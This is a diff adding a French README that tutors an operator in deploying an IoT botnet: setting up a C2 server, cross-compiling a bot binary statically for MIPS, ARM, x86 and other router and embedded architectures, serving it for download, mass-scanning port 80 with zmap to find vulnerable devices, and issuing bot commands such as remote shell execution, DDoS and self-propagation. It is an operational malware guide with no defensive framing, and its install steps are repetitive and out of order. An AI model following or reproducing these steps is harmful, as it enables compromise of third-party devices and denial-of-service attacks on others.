@@ -1,0 +1,210 @@
+CHANGE IP IN fiber.go
+
+# TUTORIEL BOTNET C2
+
+## 1. Configuration du scanner (fiber.go)
+
+1. Changer l'adresse IP dans fiber.go pour qu'elle corresponde à votre serveur C2
+2. Installer les dépendances : sudo apt install golang zmap
+3. Compiler : go build fiber.go
+
+## 2. Compilation du malware (bot.c) pour différentes architectures
+
+### Installation des dépendances
+```
+# Installation des compilateurs croisés
+sudo apt update
+sudo apt install -y gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
+sudo apt install -y gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu
+sudo apt install -y gcc-sparc64-linux-gnu
+
+# Pour la compilation 32-bit
+sudo apt install -y gcc-multilib libc6-dev-i386 linux-libc-dev:i386
+
+# Dépendances supplémentaires pour les headers manquants
+sudo apt install -y libc6-dev-mips-cross libc6-dev-arm-cross libc6-dev-arm64-cross
+sudo apt install -y libc6-dev-powerpc-cross libc6-dev-sh4-cross libc6-dev-m68k-cross
+sudo apt install -y libc6-dev-sparc64-cross
+
+# Correction pour l'erreur asm/socket.h
+# Pour x86 32-bit
+sudo mkdir -p /usr/i386-linux-gnu/include
+sudo ln -s /usr/include/asm-generic /usr/i386-linux-gnu/include/asm
+
+# Pour les autres architectures (si nécessaire)
+sudo mkdir -p /usr/mips-linux-gnu/include
+sudo ln -s /usr/include/asm-generic /usr/mips-linux-gnu/include/asm
+sudo mkdir -p /usr/arm-linux-gnueabi/include
+sudo ln -s /usr/include/asm-generic /usr/arm-linux-gnueabi/include/asm
+```
+
+### Installation des cross-compilateurs
+```
+sudo apt update
+sudo apt install -y gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
+sudo apt install -y gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu
+sudo apt install -y gcc-sparc64-linux-gnu
+# Installation des dépendances pour SPARC
+sudo apt-get update
+sudo apt-get install -y gcc-sparc64-linux-gnu
+sudo apt-get install -y libc6-dev-sparc64-cross
+
+## 4. Compilation des binaires bots (multi-arch)
+
+Place-toi dans le dossier du projet :
+```bash
+cd /chemin/vers/botnet-c2-catnet
+sudo apt-get install -y gcc-aarch64-linux-gnu
+sudo apt-get install -y gcc-powerpc-linux-gnu
+sudo apt-get install -y gcc-sh4-linux-gnu
+sudo apt-get install -y gcc-m68k-linux-gnu
+sudo apt-get install -y gcc-sparc64-linux-gnu
+
+# Dépendances pour compilation 32-bit
+sudo apt-get install -y gcc-multilib
+sudo apt-get install -y libc6-dev-i386
+sudo apt-get install -y linux-libc-dev:i386
+sudo apt-get install -y lib32gcc-9-dev
+
+# Dépendances supplémentaires pour SPARC
+sudo apt-get install -y libc6-dev-sparc64-cross
+sudo apt-get install -y linux-libc-dev-sparc64-cross
+
+
+
+# Installation complète pour SPARC et autres architectures
+sudo apt update
+sudo apt install -y \
+  gcc-mips-linux-gnu \
+  gcc-arm-linux-gnueabi \
+  gcc-aarch64-linux-gnu \
+  gcc-powerpc-linux-gnu \
+  gcc-sh4-linux-gnu \
+  gcc-m68k-linux-gnu \
+  gcc-sparc64-linux-gnu \
+  libc6-dev-sparc64-cross \
+  linux-libc-dev-sparc64-cross \
+  linux-headers-generic \
+  libc6-dev-sparc64-cross \
+  linux-headers-$(uname -r)
+
+# Créer les liens symboliques nécessaires pour toutes les architectures
+# SPARC
+sudo mkdir -p /usr/sparc64-linux-gnu/usr/include
+sudo ln -s /usr/include/asm-generic /usr/sparc64-linux-gnu/usr/include/asm
+
+# MIPS
+sudo mkdir -p /usr/mips-linux-gnu/include
+sudo ln -s /usr/include/asm-generic /usr/mips-linux-gnu/include/asm
+
+# ARM
+sudo mkdir -p /usr/arm-linux-gnueabi/include
+sudo ln -s /usr/include/asm-generic /usr/arm-linux-gnueabi/include/asm
+
+# ARM64
+sudo mkdir -p /usr/aarch64-linux-gnu/include
+sudo ln -s /usr/include/asm-generic /usr/aarch64-linux-gnu/include/asm
+
+# PowerPC
+sudo mkdir -p /usr/powerpc-linux-gnu/include
+sudo ln -s /usr/include/asm-generic /usr/powerpc-linux-gnu/include/asm
+
+# SH4
+sudo mkdir -p /usr/sh4-linux-gnu/include
+sudo ln -s /usr/include/asm-generic /usr/sh4-linux-gnu/include/asm
+
+# M68K
+sudo mkdir -p /usr/m68k-linux-gnu/include
+sudo ln -s /usr/include/asm-generic /usr/m68k-linux-gnu/include/asm
+
+
+```
+
+### Compilation pour différentes architectures
+```
+# MIPS (routeurs courants)
+mips-linux-gnu-gcc -static -o bot.mips bot.c -D__MIPS__
+
+# ARM (IoT, routeurs)
+arm-linux-gnueabi-gcc -static -o bot.arm bot.c -D__ARM__
+
+# ARM64 (appareils modernes)
+aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c -D__ARM__
+
+# x86 (ordinateurs 32-bit)
+gcc -m32 -static -o bot.x86 bot.c
+
+# x86_64 (ordinateurs 64-bit)
+gcc -static -o bot.x86_64 bot.c
+
+# PowerPC
+powerpc-linux-gnu-gcc -static -o bot.ppc bot.c -D__PPC__
+
+# SH4 (anciens appareils embarqués)
+sh4-linux-gnu-gcc -static -o bot.sh4 bot.c
+
+# M68K (anciens systèmes)
+m68k-linux-gnu-gcc -static -o bot.m68k bot.c
+
+# SPARC (serveurs)
+sparc64-linux-gnu-gcc -static -o bot.sparc bot.c -D__SPARC__
+```
+
+### Résolution des erreurs de compilation
+
+```bash
+# Résoudre l'erreur "asm/errno.h: No such file or directory"
+# Créer les liens symboliques nécessaires
+sudo mkdir -p /usr/include/asm
+sudo ln -s /usr/include/asm-generic/errno.h /usr/include/asm/errno.h
+sudo ln -s /usr/include/asm-generic/errno-base.h /usr/include/asm/errno-base.h
+```
+
+## 3. Configuration du serveur C2
+
+1. Démarrer le serveur C2 : python simple_c2.py
+2. Placer tous les binaires compilés dans le répertoire racine du serveur web
+3. Assurez-vous que le serveur web est configuré pour servir les fichiers binaires
+
+## 4. Lancement du scanner
+
+### Utilisation du fichier all.lst (recommandé)
+
+Le fichier all.lst contient des plages d'adresses IP spécifiques où vous êtes plus susceptible de trouver des appareils vulnérables.
+
+```
+# Scanner uniquement les plages d'adresses IP spécifiées dans all.lst
+sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q | ./fiber 80"
+
+# Si vous avez des problèmes avec zmap, spécifiez l'interface réseau
+sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q -i eth0 | ./fiber 80"
+# Remplacez eth0 par votre interface réseau (eth0, wlan0, etc.)
+```
+
+### Scan générique (alternative)
+
+Si vous préférez scanner des adresses IP aléatoires :
+
+```
+# Générer une liste d'adresses IP cibles
+sudo zmap -p 80 -o ips.txt -n 100000
+
+# Lancer le scanner
+cat ips.txt | ./fiber 80
+```
+
+## 5. Commandes du serveur C2
+
+Une fois que les bots sont connectés, vous pouvez envoyer les commandes suivantes :
+- PING : Vérifier si le bot est actif
+- EXEC <commande> : Exécuter une commande shell
+- SCAN <sous-réseau> : Scanner un sous-réseau (ex: SCAN 192.168.1)
+- DDOS <cible>:<port> <durée> : Lancer une attaque DDoS
+- PROPAGATE <cible> : Propager le bot à une nouvelle cible
+- EXIT : Fermer la connexion avec le bot
+
+# Si vous avez toujours des problèmes avec zmap, essayez de spécifier l'interface
+# sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q -i wlan0 | ./fiber 80"
+# Remplacez wlan0 par votre interface réseau (eth0, wlan0, etc.)
+
+---
